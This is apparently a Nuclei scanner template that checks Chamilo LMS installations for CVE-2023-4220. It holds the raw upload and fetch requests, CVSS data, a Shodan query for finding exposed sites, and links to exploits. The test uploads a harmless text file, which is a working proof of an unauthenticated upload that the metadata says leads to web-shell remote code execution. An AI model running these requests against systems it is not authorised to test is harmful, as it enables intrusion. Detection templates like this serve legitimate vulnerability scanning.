http:
- matchers:
  - condition: and
    dsl:
    - contains(body_2,"{{md5(num)}}")
    - status_code_1 == 200 && status_code_2 == 200
    type: dsl
  raw:
  - 'POST /main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=------------------------SwxF5rRaZb4lETWlpulXn3


    --------------------------SwxF5rRaZb4lETWlpulXn3

    Content-Disposition: form-data; name="bigUploadFile"; filename="{{filename}}.txt"

    Content-Type: application/octet-stream


    {{md5(num)}}


    --------------------------SwxF5rRaZb4lETWlpulXn3--

    '
  - 'GET /main/inc/lib/javascript/bigupload/files/{{filename}}.txt HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2023-4220
info:
  author: s4e-io
  classification:
    cpe: cpe:2.3:a:chamilo:chamilo_lms:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-4220
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-434
    epss-percentile: 0.99822
    epss-score: 0.93596
  description: 'Unrestricted file upload in big file upload functionality in `/main/inc/lib/javascript/bigupload/inc/bigUpload.php`
    in Chamilo LMS <= v1.11.24 allows unauthenticated attackers to perform stored
    cross-site scripting attacks and obtain remote code execution via uploading of
    web shell.

    '
  impact: 'Unauthenticated attackers can upload arbitrary files including web shells
    through the bigUpload functionality, potentially achieving remote code execution
    and compromising the entire Chamilo LMS learning management system.

    '
  metadata:
    max-request: 2
    product: chamilo_lms
    shodan-query: 'X-Powered-By: Chamilo'
    vendor: chamilo
  name: Chamilo LMS <= 1.11.24 - Remote Code Execution
  reference:
  - https://github.com/Ziad-Sakr/Chamilo-LMS-CVE-2023-4220-Exploit
  - https://github.com/charlesgargasson/CVE-2023-4220
  - https://starlabs.sg/advisories/23/23-4220/
  - https://nvd.nist.gov/vuln/detail/CVE-2023-4220
  remediation: 'Update Chamilo LMS to a version newer than 1.11.24 that validates
    file types and extensions in bigUpload.php and restricts uploads to safe file
    types only.

    '
  severity: medium
  tags: cve,cve2023,chamilo,lms,rce,intrusive,file-upload,vkev,vuln
variables:
  filename: '{{rand_base(10)}}'
  num: '{{rand_int(1000, 9999)}}'
